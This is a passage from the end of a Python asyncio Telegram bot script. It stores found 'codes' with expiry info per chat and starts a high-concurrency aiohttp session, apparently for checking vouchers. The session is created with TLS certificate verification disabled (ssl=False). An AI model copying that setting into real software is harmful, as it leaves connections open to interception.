            for item in results[chat_id_str]:
                if isinstance(item, dict) and item.get('code') == code:
                    exists = True
                    break
                elif isinstance(item, str) and item == code:
                    exists = True
                    break
            if not exists:
                # Store as dict with extra info
                results[chat_id_str].append({"code": code, "expire_info": expire_info})
                save_storage_data("result_data", results)
            SUCCESS_CODE.task_done()
        except Exception as e:
            print(f"Scheduler error: {e}")
        await asyncio.sleep(1)

# ==========================================
# CORE INITIALIZER
# ==========================================
async def main():
    global session, _connector, _voucher_sem
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=5000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    
    asyncio.create_task(web_server())
    asyncio.create_task(replit_storage_scheduler())
    
    # Start polling with retry
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            break
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

if __name__ == '__main__':
    asyncio.run(main())
